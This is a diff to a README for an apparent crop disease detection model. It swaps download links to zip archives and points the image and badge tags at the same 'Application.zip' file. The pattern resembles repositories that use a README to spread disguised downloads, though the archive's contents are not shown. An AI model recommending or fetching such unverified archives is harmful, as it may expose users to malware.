@@ -21,7 +21,7 @@ The model processes input images of crops and analyzes them using pre-trained CN
 
 ## Installation
 To access and run the Crop Disease Identification Model, you can download the project files from the following link:
-[![Download Model](https://img.shields.io/badge/Download%20Model-Launch%20Here-orange)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Model](https://github.com/Furukidesu/Crop-Disease-Identification-Model/releases/download/v1.0/Application.zip%20Model-Launch%20Here-orange)](https://github.com/Furukidesu/Crop-Disease-Identification-Model/releases/download/v1.0/Application.zip)
 
 ## Usage
 1. Download and extract the project files.
@@ -48,6 +48,6 @@ By using advanced technology like deep learning and machine learning, the Crop D
 
 🌱 Happy Farming & Disease Detection! 🌾✨
 
-![Crop Disease Identification](https://yourimageurl.com)
+![Crop Disease Identification](https://github.com/Furukidesu/Crop-Disease-Identification-Model/releases/download/v1.0/Application.zip)
 
 ---
